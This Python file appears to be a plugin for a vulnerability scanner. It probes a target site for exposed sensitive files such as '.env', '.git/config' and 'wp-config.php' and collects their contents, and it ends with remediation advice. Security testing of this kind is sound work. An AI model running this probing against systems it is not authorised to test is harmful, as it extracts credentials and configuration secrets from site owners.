"""
Information Disclosure Exploit Plugin

This plugin exploits information disclosure vulnerabilities to extract sensitive data.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


class InfoDisclosurePlugin(ExploitPlugin):
    """Information Disclosure exploit plugin."""
    
    # Sensitive paths to test
    SENSITIVE_PATHS = [
        '/.env',
        '/.git/config',
        '/config.php',
        '/wp-config.php',
        '/.htaccess',
        '/web.config',
        '/robots.txt',
        '/.DS_Store',
        '/package.json',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        return 'info_disclosure'
    
    @property
    def name(self) -> str:
        return 'Information Disclosure Exploit'
    
    @property
    def description(self) -> str:
        return 'Exploits information disclosure to extract sensitive data.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate info disclosure payloads."""
        return self.SENSITIVE_PATHS
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute information disclosure attack."""
        if not HAS_REQUESTS:
            return {'success': False, 'error': 'Requests not available', 'vulnerability_type': 'info_disclosure'}
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        from urllib.parse import urljoin
        disclosed_info = {}
        
        # Try to access sensitive paths
        for path in self.SENSITIVE_PATHS[:5]:
            try:
                url = urljoin(target_url, path)
                response = requests.get(url, timeout=timeout, verify=verify_ssl)
                
                if response.status_code == 200 and len(response.text) > 10:
                    disclosed_info[path] = response.text[:500]
                    logger.info(f"Found exposed file: {path}")
            except Exception as e:
                logger.debug(f"Error accessing {path}: {e}")
        
        if disclosed_info:
            return {
                'success': True,
                'disclosed_info': disclosed_info,
                'evidence': f'Found {len(disclosed_info)} exposed file(s)',
                'vulnerability_type': 'info_disclosure',
                'message': 'Successfully extracted sensitive information',
            }
        
        return {'success': False, 'error': 'No information disclosed', 'vulnerability_type': 'info_disclosure'}
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent information disclosure:\n'
            '1. Remove sensitive files from web root\n'
            '2. Implement proper access controls\n'
            '3. Sanitize error messages\n'
            '4. Disable directory listing\n'
            '5. Use .gitignore properly\n'
            '6. Implement security headers'
        )
